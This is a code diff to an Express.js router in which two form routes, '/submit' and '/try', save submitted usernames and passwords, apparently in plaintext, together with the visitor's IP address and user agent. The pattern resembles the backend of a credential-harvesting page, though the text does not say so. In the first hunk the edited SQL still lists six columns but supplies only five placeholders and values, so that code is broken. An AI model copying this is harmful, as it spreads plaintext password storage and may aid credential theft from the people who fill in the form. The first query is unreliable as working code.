@@ -37,12 +37,12 @@ router.post('/submit', validateFormData, (req, res) => {
     // const ip = req.socket.remoteAddress; 
     const useragent = req.get('User-Agent');
     const date = new Date();
-    const notify = 0;
+
 
 
     
-                            const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
-                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
+                            const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?)';
+                            db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
                                 if (err) {
                                     console.error('Error inserting record:', err);
                                     return res.status(500).send('Internal Server Error');
@@ -79,13 +79,12 @@ router.post('/try', validateFormData2, (req, res) => {
     //const ip = req.socket.remoteAddress; 
     const useragent = req.get('User-Agent');
     const date = new Date();
-    const notify = 0;
-        
+       
     
     
     
-                    const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
-                    db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
+                    const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
+                    db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
                         if (err) {
                             console.error('Error inserting record:', err);
                             return res.status(500).send('Internal Server Error');
